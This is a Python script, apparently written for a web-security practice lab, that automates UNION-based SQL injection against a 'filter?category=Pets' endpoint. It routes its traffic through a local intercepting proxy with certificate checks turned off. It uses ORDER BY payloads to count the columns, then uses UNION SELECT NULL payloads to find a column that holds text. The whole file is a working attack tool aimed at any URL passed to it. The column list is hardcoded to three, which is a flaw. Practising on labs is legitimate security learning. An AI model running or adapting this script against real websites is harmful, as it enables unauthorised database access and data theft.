import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def data_field(url,total_colomn):
    string=input("Enter the string with the quotes")
    parameter="filter?category=Pets"
    for i in range(1,total_colomn+1):
        list=['NULL']*3
        list[i-1]=string
        payload="' UNION SELECT " + ','.join(list) + " --"
        print(payload)
        r=requests.get(url+parameter+payload,verify=False,proxies=proxies)
        result=r.text
        if "Internal Server Error"not in result:
            return i
    return False


def sqli(url):
    parameter="filter?category=Pets"
    for i in range(1,50):
        payload="'+order+by+%s--"%i
        r=requests.get(url+parameter+payload,verify=False,proxies=proxies)
        read=r.text
        if "Internal Server Error" in read:
            return i-1
    return False


if __name__=="__main__":
    try:
        url=sys.argv[1]
    except:
        print("[+] Usage : %s <url> "%sys.argv[0])
        print("[+] Usage : %s www.example.com"%sys.argv[0])
        sys.exit(-1)

    total_colomns=sqli(url)
    if total_colomns:
        print("[+] SQL injection successfull,The number of colomns are %s"%total_colomns)
    else:
        print("[-] SQL injection unsuccessfull")
    

    data_colomn=data_field(url,total_colomns)

    if data_colomn:
        print(f"[+] Sql successful successful and string colomn is {data_colomn}")
    else:
        print("[-] Unable to determine data colomn")


   